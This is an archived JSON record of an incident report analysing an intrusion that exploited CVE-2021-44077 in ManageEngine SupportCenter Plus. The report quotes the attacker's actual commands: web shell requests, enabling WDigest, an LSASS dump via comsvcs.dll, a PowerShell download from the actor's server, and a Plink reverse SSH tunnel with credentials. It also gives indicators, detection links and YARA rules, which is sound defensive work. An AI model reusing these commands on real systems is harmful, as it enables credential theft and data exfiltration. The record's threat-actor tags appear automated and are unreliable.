{
    "id": "a528f028-0b10-4b14-8721-64b61289a28b",
    "created_at": "2023-01-12T15:05:05.886425Z",
    "updated_at": "2025-03-27T02:09:18.502719Z",
    "deleted_at": null,
    "sha1_hash": "8c9b996138a75d6117991ca76e28ff4f990d84de",
    "title": "2022-06-06 - Will the Real Msiexec Please Stand Up- Exploit Leads to Data Exfiltration",
    "authors": "",
    "file_creation_date": "2022-06-13T04:01:55Z",
    "file_modification_date": "2022-06-13T04:01:55Z",
    "file_size": 2178612,
    "plain_text": "# Will the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration\n\n**[thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/](https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/)**\n\nJune 6, 2022\n\nIn this multi-day intrusion, we observed a threat actor gain initial access to an organization by\nexploiting a vulnerability in ManageEngine SupportCenter Plus. The threat actor, discovered\nfiles on the server and dumped credentials using a web shell, moved laterally to key servers\nusing Plink and RDP and exfiltrated sensitive information using the web shell and RDP.\n\n[The FBI and CISA published an advisory noting that APT attackers were using](https://www.cisa.gov/uscert/ncas/alerts/aa21-336a) CVE-202144077 to gain initial access to the networks of organizations of Critical Infrastructure Sectors\nsuch as healthcare, financial, electronics and IT consulting industries.\n\n## Case Summary\n\nThe intrusion began with the exploitation of an internet-facing instance of ManageEngine\n[SupportCenter Plus via the CVE-2021-44077 vulnerability. The threat actor successfully](https://nvd.nist.gov/vuln/detail/CVE-2021-44077)\nexploited the RCE vulnerability in SupportCenter Plus, which allowed them to drop a web\n\n\n-----\n\nshell in an internet accessible directory. The exploit we witnessed looks very similar to a\n[publicly available POC exploit on GitHub.](https://github.com/horizon3ai/CVE-2021-44077)\n\nThe threat actor then performed some generic enumeration of the system and enabled\nWDigest authentication on the server using the web shell. Enumeration on the system\nincluded querying network configuration, a list of domain joined computers, user and OS\ninformation, and current user sessions on the beachhead.\n\nPeriodically over several days, the threat actor returned and checked what users were\nlogged into the beachhead server using the webshell. Finally, on the seventh day, the threat\nactors performed an LSASS dump on the system, which captured the credentials of an\nadministrative user that had recently logged into the system. In this case, the threat actor\nhad access to the user’s plaintext credentials as a result of WDigest authentication being\npreviously enabled.\n\nThe following day the threat actor downloaded ekern.exe, which was a renamed version of\n[Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the](https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html)\nbeachhead server. An interactive RDP session was successfully established to the\nbeachhead server by the threat actor where they began enumerating other computers on the\nnetwork.\n\nFrom the beachhead, lateral movement was conducted to three other servers via RDP,\nincluding a domain controller, a file server, and another server. Confidential files were\nexfiltrated from the network throughout this intrusion using a mixture of web shell access and\nhands-on keyboard access via RDP.\n\nThese files, were critical to the business and it’s partner. The documents were selectively\nchosen as if the attackers were looking for specific material. When it came time to exfiltrate\ncertain files or folders, one folder of the utmost importance was exfiltrated while passing on\nother partner folders and files.\n\nBesides the files and folders mentioned, internal machine certs were reviewed and later\nexfiltrated. The exfiltrated information has not been found in any public dumps or sales to\ndate.\n\nThe threat actors were evicted from the network soon after stealing this information.\n\n## Services\n\n[We offer multiple services including a Threat Feed service which tracks Command and](https://thedfirreport.com/services/)\nControl frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire,\n[PoshC2, etc. More information on this service and others can be found here.](https://thedfirreport.com/services/)\n\n## Timeline\n\n\n-----\n\n-----\n\n[Report Lead: @iiamaleks](https://twitter.com/iiamaleks)\n\n[Contributing Analysts: @svch0st &](https://twitter.com/svch0st) [v3t0_](https://twitter.com/v3t0_)\n\n\n-----\n\n## Initial Access\n\nInitial access began with the exploitation of ManageEngine SupportCenter Plus via CVE2021-44077, an unauthenticated remote code execution vulnerability. There are two main\nHTTP requests responsible for this exploit.\n\nThe first request sent a POST containing the contents of a PE file which was written to:\n```\nC:\\Program Files\\ManageEngine\\SupportCenterPlus\\bin\\msiexec.exe\n/RestAPI/ImportTechnicians?step=1\n\n```\nThe second request, attempted to install Zoho’s Site24x7 performance monitoring tool but\nindirectly invoked the uploaded msiexec.exe file. More details regarding this are covered in\nthe Execution section.\n```\n/RestAPI/s247action?execute=s247AgentInstallationProcess&apikey=asdasd\n\n```\nThe exploitation attempts against the internet-facing server arrived from two Tor exit nodes.\nEach step of the exploit was observed originating from a different TOR exit node.\n```\n2.58.56.14\n185.220.101.76\n\n```\n\n-----\n\n## Execution\n\n\n-----\n\nThe second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho’s\nSite24x7 performance monitoring tool. Support Center Plus will do this by invoking the\ninstallation via msiexec.exe by running:\n```\nmsiexec.exe /i Site24x7WindowsAgent.msi EDITA1=asdasd /qn\n\n```\nThe running path of Support Center Plus at the time this command runs is `C:\\Program`\n```\nFiles\\ManageEngine\\SupportCenterPlus\\bin\\ which means the msiexec.exe\n\n```\nuploaded by the threat actor will be favored rather than the legitimate Microsoft utility.\n\nOnce the malicious `msiexec.exe is executed an embedded Java payload will be decoded`\nand written to:\n```\nC:\\Program Files\\ManageEngine\\SupportCenterPlus\\custom\\login\\fm2.jsp\n\n```\n\n-----\n\nThe parameters passed to `msiexec.exe are never used and the Site24x7 performance`\nmonitoring tool is never installed.\n\nThe web shell was written to:\n```\nC:\\Program files\\ManageEngine\\SupportCenterPlus\\Custom\\Login\\fm2.jsp\n\n```\nThis location is web accessible which means the threat actors can interact with the web shell\nthrough a web browser from the internet. Here are a few commands run through the web\nshell.\n\n\n-----\n\n```\nhttps://server.example/custom/login/fm2.jsp?cmd arp a\nhttps://server.example/custom/login/fm2.jsp?cmd=del c:\\windows\\temp\\logctl.zip\nhttps://server.example/custom/login/fm2.jsp?cmd=systeminfo\nhttps://server.example/custom/login/fm2.jsp?cmd=tasklist\nhttps://server.example/custom/login/fm2.jsp?cmd=wmic computersystem get domain\n\n```\nThe following diagram visually illustrates the CVE-2021-44077 exploitation and execution\nprocess.\n\n### Interesting information related to msiexec.exe\n```\ncompiler timestamp of Thu Nov 14 12:00:07 2075\ndebugger timestamp of Wed Oct 03 09:01:59 2068\nFile version 1.0.0.0\nPDB of c:\\users\\administrator\\msiexec\\msiexec\\msiexec\\obj\\x86\\debug\\msiexec.pdb\n.NET(v4.0.30319)\n\n```\nThe threat actors had previously uploaded a different file, named the same thing minutes\nbefore the web shell was created. After the execution of that file seemed to fail, the threat\nactors uploaded the msiexec.exe file from above which created the web shell seconds later.\n\nThe two msiexec files included the same web shell but had some differing characteristics.\nHere is some information on the first attempted msiexec file which failed.\n```\ncompiler timestamp of Mon Oct 17 01:32:17 2067\ndebugger timestamp of Sat Apr 15 14:30:09 1995\nFile version 1.0.0.0\nPDB of m:\\work\\shellll\\msiexec\\msiexec\\obj\\release\\msiexec.pdb\n.NET(v2.0.50727)\n\n```\nThe main difference being the interesting PDB path m:\\work\\shellll\\ and the differing .NET\nversions\n\n\n-----\n\n### Application logs\n\nWe can see from the Catalina.txt log that when the threat actors run certain commands such\nas fxs.bat (RDP tunneling) the application thinks the process is hung (runs for 30+ seconds)\nand creates a warning message:\n```\n[REDACTED]|[REDACTED]|[org.apache.catalina.valves.StuckThreadDetectionValve]|\n[WARNING]|[57]: Thread [/login/fm2.jsp-1649702723966_###_] (id=[64]) has been active\nfor [39,915] milliseconds (since REDACTED]) to serve the same request for\n[http://REDACTED:8080/custom/login/fm2.jsp?cmd=C%3A%5CWindows%5Ctemp%5Cfxs.bat] and\nmay be stuck (configured threshold for this StuckThreadDetectionValve is [30]\nseconds). There is/are [1] thread(s) in total that are monitored by this Valve and\nmay be stuck.|\n\n```\nIn the Securitylog0.txt file, we can see the request made to the web shell and timestamp over\nand over but not much else.\n```\n[REDACTED]|[REDACTED]|[com.manageengine.servicedesk.filter.SdpSecurityFilter]|[INFO]|\n[76]: RequestURI::::::: /login/fm2.jsp|\n\n```\nThese are all the Support Center Plus logs we could find relating to this intrusion, leaving a\nlot to be desired.\n\n## Persistence\n\nThe web shell dropped to the beachhead during the exploitation process was the only form\nof persistence observed during the intrusion.\n\nThere are multiple remote interaction capabilities in the Java web shell, including:\n\nExecution of commands\nView and download files\nCreation of new files\n\n\n-----\n\n## Privilege Escalation\n\nPrivilege escalation was not needed on the beachhead ManageEngine server as the exploit\nprovided the execution of commands through the web shell SYSTEM level privileges. Later\nduring the intrusion they dumped credentials for a user that had privilege’s allowing lateral\nmovement throughout the environment. More on the dumping method in the Credential\nAccess section.\n\n\n-----\n\n## Defense Evasion\n\nDuring the initial access, an attacker uploaded a binary named msiexec.exe onto the system.\nThis binary isn’t the legitimate Microsoft msiexec.exe, rather it is a dropper that contains an\nembedded encoded web shell. The naming of this executable has the benefit of blending into\nthe environment and appearing legitimate, while also being critical to the exploitation of CVE2021-44077.\n\nDuring a later stage of the intrusion, an attacker dumped the LSASS process (see Credential\nAccess section). After exfiltrating the LSASS dump, the attacker deleted the dump file to hide\ntheir traces.\n\nOnce the credentials were harvested from the LSASS dump, the threat actor returned to the\nenvironment and downloaded the binary named ekern.exe to tunnel RDP connections over\nSSH. Ekern.exe is the [plink.exe tool renamed in order to stay under the radar. Furthermore,](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)\n[the name ekern.exe is similar to the name of a known component of ESET named ekrn.exe.](https://www.processlibrary.com/en/directory/files/ekrn/400651/)\n\nOn the beachhead system, the threat actor queried the registry checking to see if WDigest\nwas enabled:\n\n\n-----\n\n```\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\n\n```\nWDigest allows for credential caching in LSASS which will result in a users plaintext\npassword being stored in memory. The intended purpose of WDigest credential caching is to\nfacilitate clear text authentication with HTTP and SASL, however, this can be misused by the\nthreat actor to retrieve the plaintext credentials of a user.\n\nHere’s the command executed from the web shell:\n```\npowershell.exe reg query\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\n\n```\nThis registry value was not present on the system, which informed the attacker that WDigest\nwas disabled on the beachhead.\n\nTwenty-two seconds later, the threat actor enabled WDigest using the following command,\nvia the web shell:\n```\npowershell.exe Set-ItemProperty -Force -Path \n'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name \n'UseLogonCredential' -Value '1'\n\n## Credential Access\n\n```\nAfter enabling WDigest, the attacker checked back numerous times over multiple days to see\nwho was signed in. During this period, a privileged user logged onto the system for\n[maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll. The](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)\n\n\n-----\n\nthreat actor listed the running processes via the tasklist command and used the PID of\nLSASS from the output to pass to the credential dumping command.\n```\n\"C:\\windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump \nC:\\windows\\temp\\logctl.zip full\n\n```\nThe LSASS dump was then exfiltrated out of the environment for offline analysis and rest of\nthe actions were conducted from the account whose password was extracted from the\nLSASS dump.\n\n## Discovery\n\nThe threat actor used the web shell `fm2.jsp to conduct their initial discovery on the host.`\nBelow are the GET requests sent to the web shell with the discovery commands passed to\nthe `cmd parameter, which runs as PowerShell.`\n\n\n-----\n\n```\npowershell.exe reg query\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\npowershell.exe query session\npowershell.exe systeminfo\npowershell.exe quser\npowershell.exe arp -a\npowershell.exe wmic computersystem get domain\npowershell.exe netstat -an\npowershell.exe ipconfig /all\n\n```\nThey also used the web shell to review directories, here’s a few examples\n```\n/custom/login/fm2.jsp?p=C:/Windows/Temp&action=get\n/custom/login/fm2.jsp?p=C:/Windows&action=get\n/custom/login/fm2.jsp?p=C:/&action=get\n/custom/login/fm2.jsp?p=C:/ALLibraries&action=get\n/custom/login/fm2.jsp?p=C:/Users&action=get\nC:/Windows/Temp\nC:/Windows\nC:/\nC:/ALLibraries\nC:/Users\n\n## Lateral Movement\n\n```\nThe threat actor used the web shell to download `file.exe onto the beachhead and save it`\nas `ekern.exe using a PowerShell download cradle.`\n```\npowershell.exe (New-Object\nSystem.Net.WebClient).DownloadFile('hXXp://23.81.246[.]84/file.exe',\n'c:\\windows\\temp\\ekern.exe')\n\n```\nThe file `ekern.exe was a renamed copy of` `Plink.exe, a command-line SSH client.`\n\n\n-----\n\nPlink was used in conjunction with a batch script named `FXS.bat to establish an SSH`\nconnection with the threat actor’s server.\n\nLet’s break down what this command means:\n\n\n-----\n\nOption Meaning\n\necho y | Providing “y” as standard input to the executable. To\nconfirm when plink asks if they would like the public\nkey added to known hosts.\n\nc:\\Windows\\temp\\ekern.exe Plink executable\n\n-ssh Force the use of SSH (Plink can support other\nprotocols)\n\n-P 443 Define a specific target port for SSH connection\n\n-l admin1 Connect with the specified username\n\n\n-pw\n\n[[email protected]#$345sdfDFVCDF](https://thedfirreport.com/cdn-cgi/l/email-protection)\n\n-R\n23.81.246.84:49800:127.0.0.1:3389\n\n\nPassword to authenticate with\n\nListen on 23.81.246.84:49800 and forward it to\n127.0.0.1:3389. This effectively proxies the request\nto the host running the command\n\n\n23.81.246.84 Target server to SSH\n\nThe actor defined a custom target port to Plink ( -P 443 ) instead of the default SSH port of\n```\n22 .\n\n```\nThe actor used the technique of port forwarding to listen on the remote port,\n23.81.246[.]84:49800, and forward the requests to 127.0.0.1:3389. This resulted in the actor\nbeing able to RDP to the beachhead server via the SSH tunnel.\n\n\n-----\n\nThe script `FXS.bat was re-used multiple times to establish connections to various hosts.`\n\nThe actor then replaced the loopback address with various internal hosts. The\nManageEngine server acted as a proxy that forwarded the RDP traffic between the target\nhost and the threat actor’s server:\n```\necho y|C:\\windows\\temp\\ekern.exe -ssh -P 443 -l admin1 -pw\n[email protected]#$345sdfDFVCDF -R 23.81.246.84:49800:10.X.X.X:3389 23.81.246.84\n\n```\n\n-----\n\n## Command and Control\n\nAll command and control traffic we observed was through the SSH tunnel to\n```\n23.81.246.84 . That IP address was exposing an SSH server on port 443 which was\n\n```\nwhat the beachhead made connections with.\n\nThe headers of `23.81.246.84:433 reported the threat actor was using a Bitvise SSH`\nServer:\n```\nSSH-2.0-8.49 FlowSsh: Bitvise SSH Server (WinSSHD) 8.49: free only for personal noncommercial use\nKey type: ssh-rsa\nKey: AAAAB3NzaC1yc2EAAAADAQABAAABgQDiz99PA7RuWA1mO7OHiG83q0yqpMF2U/b2iDZNfrLSHnq0\nmb+H/RexV2sgYwWaKNDTKtm6+YMlAgwOpr8dW4+22pknXagsBs1ln/uza+a0QUZjhTi1/jGyaiLL\n0AV0WPr7u7mAeCx4U9s0n2WTyXmGZAgZHJBQl+wsRWJgbSxSKAr4cV6knFNuK0oXxp1NzJXzMQeD\nO2sUqQ8+uymA4TMNLGyX6T5EHQiP2vVhio7NlPsnqJb7ilYsrPWPWIV/rB5ALii+G598moQbJcLL\nBanDFjWDQ+7z3fNHN0YH7wIozkdgsQKqBVv37HQcCYfySc82HYq+vD7yA54nS/UChZBHTTPXDupf\nJJScG9vJKklKNb5a49uzDVhsB9yT/Ihrvlex52z1gXenrt97WnaGILsl0ljuVbtBQmELZK126hPJ\nIysJ+YuBfqDYokvELi7aZKRR6wjYFeGpcB0FErekuUaalUSvuX14xHxtm2vuKVARwdogMBvKDLL7\nB5gxckIsNuk=\nFingerprint: 68:22:ef:82:8b:57:e4:62:37:86:61:bc:98:fc:53:35\n\n## Exfiltration\n\n```\nAfter getting a foothold on the beachhead machine, an attacker first downloaded the\npostgres DB backup of the ManageEngine SupportCenter Plus application using the web\nshell.\n\nSeven days after initial access, an attacker exfiltrated a certificate from the server, a Visio\nfile, and an excel sheet for the accounts via web shell:\n\nServer certificate downloaded via web shell:\n\n\n-----\n\nVisio file downloaded via web shell:\n\nExcel file downloaded via web shell:\n\nAn attacker was also seen exfiltrating confidential documents during a RDP session and\ntriggering canary tokens from 192.221.154.141 and 8.0.26.137 upon opening the documents.\n\n## Impact\n\nThe threat actors were evicted from the network soon after stealing confidential information.\n\n## Indicators\n\n### Atomic\n\n\n-----\n\n```\nSSH Reverse Proxy \n23.81.246.84\nWebshell Query IP\n5.239.37.78\n5.114.3.200\n5.113.111.4\n35.196.132.85\nManageEngine Exploit Origin\n2.58.56.14\n185.220.101.76\nCanary Document Alert IP\n8.0.26.137\n192.221.154.141 (updated 6/6 15:55 UTC, was missing the 41 at the end)\n\n### Computed\nfm2.jsp\n05cee9b71bdd99c22dde19957a6169e7\na188d7283c2b4744c4e91f18c59588c8471a2a86\n8703f52c56b3164ae0becfc5a81bfda600db9aa6d0f048767a9684671ad5899b\nFXS.bat\n03cbb2227284c4842906d3576372e604\n8aeb24b51b339446cac2cb0a4c93ad98f709cf53\n6e5289df8be0403eda9f63f14c3b3c753a11e924e00484958166d03fcf922510\nekern.exe\n848f7edb825813aee4c09c7f2ec71d27\n4709827c7a95012ab970bf651ed5183083366c79\n828e81aa16b2851561fff6d3127663ea2d1d68571f06cbd732fdf5672086924d\nmsiexec.exe\n0be5d9235059cb4f8b16fe798e822444\nd18c88294c776815a5b1be0bd4508c9442b3877a\n4d8f797790019315b9fac5b72cbf693bceeeffc86dc6d97e9547c309d8cd9baf\nmsiexec.exe (failed)\n9872E0A47E2F44BF6E22E976F061DAC0\n916952C5407233EEC5C0176C0E04F88AF9E63978\nC7862701AD23B631EF854570C67FC33331F6853DCA65D4C3E825E2C3BB9B16EE\n\n Behavioral\nSee custom Sigma rules below for additional behaviors turned into rules.\nThe threat actor would exploit ManageEngine via CVE-2021-44077 from a Tor Exit Node\n(2.58.56.14 and 185.220.101.76) followed by the execution of a webshell extractor\nmatching the name msiexec.exe\nA batch script is used to facilitate rdp tunneling including the use of Plink.\nCanary alerts for documents exfiltrated from the network were observed being opened\nfrom the IP addresess 8.0.26.137 and 192.221.154.141\n\n## Detections\n\n```\n\n-----\n\n### Network\n```\nET TOR Known Tor Exit Node Traffic group 48\nET TOR Known Tor Relay/Router (Not Exit) Node Traffic group 48\nET EXPLOIT [CISA AA21-336A] Zoho ManageEngine ServiceDesk Possible Exploitation\nActivity (CVE-2021-44077)\nET INFO Generic HTTP EXE Upload Inbound\nET INFO Executable Download from dotted-quad Host\n\n Sigma\n\n```\nCustom Sigma rules\n\n[Webshell Usage with ManageEngine SupportCenter Plus](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Webshell%20Usage%20with%20ManageEngine%20SupportCenter%20Plus)\n\n[SSH over port 443 with known Server and Client Strings](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/SSH%20over%20port%20443%20with%20known%20Server%20and%20Client%20Strings)\n\n[Registry Query for WDigest](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Registry%20Query%20for%20WDigest)\n\n[Enable WDigest using PowerShell](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Enable%20WDigest%20using%20PowerShell)\n\n[Enable WDigest using PowerShell (ps_module)](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Enable%20WDigest%20using%20PowerShell%20(ps_module))\n\nSigmaHQ rules\n\nPowerShell Download from URL:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_powershell_download.yml\n\nPowerShell DownloadFile:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_ps_downloadfile.yml\n\nProcess Dump via Comsvcs DLL:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_comsvcs_procdump.yml\n\nProcess Dump via Rundll32 and Comsvcs.dll:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_process_dump_rundll32_comsvcs.yml\n\nSuspicious MsiExec Directory:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_msiexec_cwd.yml\n\n\n-----\n\nWdigest Enable UseLogonCredential:\nhttps://github.com/SigmaHQ/sigma/blob/b4cb047ae720b37b11f8506de7965dc29d5920be/rul\nes/windows/registry/registry_set/registry_set_wdigest_enable_uselogoncredential.yml\n\nWindows PowerShell Web Request:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/\nposh_ps_web_request.yml\n\nWindows Webshell Creation:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_web\nshell_creation_detect.yml\n\nShells Spawned by Web Servers:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_webshell_spawn.yml\n\nSuspicious Plink Remote Forwarding:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_plink_remote_forward.yml\n\nWebshell Detection With Command Line Keywords:\nhttps://github.com/SigmaHQ/sigma/blob/329074d935ac81dd91cafdce5e5a43c95cca068d/rul\nes/windows/process_creation/proc_creation_win_webshell_detection.yml\n\n### Yara\n\n\n-----\n\n```\n/\n  YARA Rule Set\n  Author: The DFIR Report\n  Date: 2022-06-06\n  Identifier: Case 12993\n  Reference: https://thedfirreport.com/2022/06/06/will-the-real-msiexec-pleasestand-up-exploit-leads-to-data-exfiltration/\n*/\n/* Rule Set ----------------------------------------------------------------- */\nrule case_12993_cve_2021_44077_msiexec {\n  meta:\n   description = \"Files - file msiexec.exe\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com/2022/06/06/will-the-real-msiexec-pleasestand-up-exploit-leads-to-data-exfiltration/\"\n   date = \"2022-06-06\"\n   hash1 = \"4d8f797790019315b9fac5b72cbf693bceeeffc86dc6d97e9547c309d8cd9baf\"\n  strings:                                     \n   $x1 =\n\"C:\\\\Users\\\\Administrator\\\\msiexec\\\\msiexec\\\\msiexec\\\\obj\\\\x86\\\\Debug\\\\msiexec.pdb\"\nfullword ascii                                    \n   $x2 = \"M:\\\\work\\\\Shellll\\\\msiexec\\\\msiexec\\\\obj\\\\Release\\\\msiexec.pdb\" fullword\nascii\n   $s2 = \"..\\\\custom\\\\login\\\\fm2.jsp\" fullword wide                \n   $s3 =\n\"Qk1QDQo8JUBwYWdlIGltcG9ydD0iamF2YS51dGlsLnppcC5aaXBFbnRyeSIlPg0KPCVAcGFnZSBpbXBvcnQ9I\n wide                                        \n   $s4 = \"Program\" fullword ascii /* Goodware String - occured 194 times */    \n   $s5 = \"Encoding\" fullword ascii /* Goodware String - occured 809 times */   \n   $s6 = \"base64EncodedData\" fullword ascii /* Goodware String - occured 1 times\n*/                                          \n   $s7 = \"System.Runtime.CompilerServices\" fullword ascii /* Goodware String occured 1950 times */                                \n   $s8 = \"System.Reflection\" fullword ascii /* Goodware String - occured 2186\ntimes */                                       \n   $s9 = \"System\" fullword ascii /* Goodware String - occured 2567 times */    \n   $s10 = \"Base64Decode\" fullword ascii /* Goodware String - occured 3 times */  \n   $s11 = \"$77b5d0d3-047f-4017-a788-503ab92444a7\" fullword ascii         \n   $s12 = \" 2021\" fullword wide                         \n   $s13 = \"RSDSv_\" fullword ascii                         \n   $s14 = \"503ab92444a7\" ascii                          \n   $s15 = \"q.#z.+\" fullword wide                         \n  condition:                                    \n   uint16(0) == 0x5a4d and filesize < 90KB and                  \n   1 of ($x*) and 4 of them                            \n}                                          \n\n```\n\n-----\n\n```\nrule case_12993_cve_2021_44077_webshell {                      \n  meta:                                       \n   description = \"Files - file fm2.jsp\"                      \n   author = \"The DFIR Report\"                           \n   reference = \"https://thedfirreport.com/2022/06/06/will-the-real-msiexec-pleasestand-up-exploit-leads-to-data-exfiltration/\"                    \n   date = \"2022-06-06\"                              \n   hash1 = \"8703f52c56b3164ae0becfc5a81bfda600db9aa6d0f048767a9684671ad5899b\"   \n  strings:                                     \n   $s1 = \"  Process powerShellProcess = Runtime.getRuntime().exec(command);\"\nfullword ascii                                    \n   $s2 = \"out.write((\\\"User:\\\\t\\\"+exec(\\\"whoami\\\")).getBytes());\" fullword ascii \n   $s3 = \"return new\nString(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByt\n fullword ascii                                   \n   $s4 = \"out.println(\\\"<pre>\\\"+exec(request.getParameter(\\\"cmd\\\"))+\\\"</pre>\\\");\"\nfullword ascii                                    \n   $s5 = \"out.println(\\\"<tr \\\"+((i%2!=0)?\\\"bgcolor=\\\\\\\"#eeeeee\\\\\\\"\\\":\\\"\\\")+\\\"><td\nalign=\\\\\\\"left\\\\\\\">&nbsp;&nbsp;<a href=\\\\\\\"javascript:ge\" ascii           \n   $s6 = \"out.println(\\\"<h1>Command execution:</h1>\\\");\" fullword ascii      \n   $s7 = \"  String command = \\\"powershell.exe \\\" +\nrequest.getParameter(\\\"cmd\\\");\" fullword ascii                    \n   $s8 = \"shell(request.getParameter(\\\"host\\\"),\nInteger.parseInt(request.getParameter(\\\"port\\\")));\" fullword ascii          \n   $s9 = \"out.write(exec(new String(b,0,a,\\\"UTF-8\\\").trim()).getBytes(\\\"UTF8\\\"));\" fullword ascii                                \n   $s10 = \"static void shell(String host,int port) throws UnknownHostException,\nIOException{\" fullword ascii                             \n   $s11 = \"      powerShellProcess.getErrorStream()));\" fullword ascii   \n   $s12 = \"encoding = isNotEmpty(getSystemEncoding())?\ngetSystemEncoding():encoding;\" fullword ascii                    \n   $s13 = \"  // Executing the command\" fullword ascii              \n   $s14 = \".getName()+\\\"\\\\\\\"><tt>download</tt></a></td><td align=\\\\\\\"right\\\\\\\">\n<tt>\\\"+new SimpleDateFormat(\\\"yyyy-MM-dd hh:mm:ss\\\").format(\" ascii         \n   $s15 = \"String out = exec(cmd);\" fullword ascii                \n   $s16 = \"static String exec(String cmd) {\" fullword ascii\n   $s17 = \"      powerShellProcess.getInputStream()));\" fullword ascii\n   $s18 = \"response.setHeader(\\\"Content-Disposition\\\", \\\"attachment;\nfilename=\\\"+fileName);\" fullword ascii\n   $s19 = \"out.println(\\\"\n<pre>\\\"+auto(request.getParameter(\\\"url\\\"),request.getParameter(\\\"fileName\\\"),request.\n</p\" ascii\n   $s20 = \"  powerShellProcess.getOutputStream().close();\" fullword ascii\n  condition:\n   uint16(0) == 0x4d42 and filesize < 30KB and\n   8 of them\n}\n\n## MITRE\n\n```\nT1190 – Exploit Public-Facing Application\n\nT1572 – Protocol Tunneling\n\nT1012 – Query Registry\n\n\n-----\n\nT1003 – OS Credential Dumping\nT1087 – Account Discovery\nT1057 – Process Discovery\nT1021.001 – Remote Services: Remote Desktop Protocol\nT1059.001 – Command and Scripting Interpreter: PowerShell\nT1047 – Windows Management Instrumentation\nT1070.004: File Deletion\nT1078.002 – Domain Account\nT1112 – Modify Registry\nT1036 – Masquerading\nT1505.003 – Server Software Component: Web Shell\n\nInternal case #12993\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-06 - Will the Real Msiexec Please Stand Up- Exploit Leads to Data Exfiltration.pdf"
    ],
    "report_names": [
        "2022-06-06 - Will the Real Msiexec Please Stand Up- Exploit Leads to Data Exfiltration.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535905,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1655092915,
    "ts_modification_date": 1655092915,
    "files": {
        "pdf": "https://archive.orkl.eu/8c9b996138a75d6117991ca76e28ff4f990d84de.pdf",
        "text": "https://archive.orkl.eu/8c9b996138a75d6117991ca76e28ff4f990d84de.txt",
        "img": "https://archive.orkl.eu/8c9b996138a75d6117991ca76e28ff4f990d84de.jpg"
    }
}